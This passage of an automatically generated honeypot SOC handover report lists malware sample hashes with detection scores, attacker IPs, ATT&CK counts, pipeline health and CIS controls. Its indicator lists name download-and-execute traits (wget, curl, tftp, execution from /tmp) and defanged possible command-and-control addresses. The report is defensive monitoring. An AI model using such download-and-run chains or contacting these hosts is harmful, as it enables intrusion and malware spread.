| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.242.104[.]81` | ID | PT Lintas Jaringan Nusantara | **100** ⚠️ | 5 |
| `107.150.146[.]69` | US | Internap Network Services Corporation | **100** ⚠️ | 41 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `139.59.147[.]236` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `115.190.165[.]93` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 8 |
| `95.165.27[.]83` | RU | Moscow Local Telephone Network (OAO MGTS) | **100** ⚠️ | 25 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `160.187.180[.]146` | PK | Dinco Pakistan private limited | **100** ⚠️ | 17 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 84 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 79 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (71 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 65 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 306 cases |
| Tool 34  | Credential Extractor        | ✅ 93 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 41 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 71 filtered (23.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 84 priority case(s) shown individually · 23 recon entry/entries in table (14 group(s) consolidating 142 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-04T23:02:10Z_
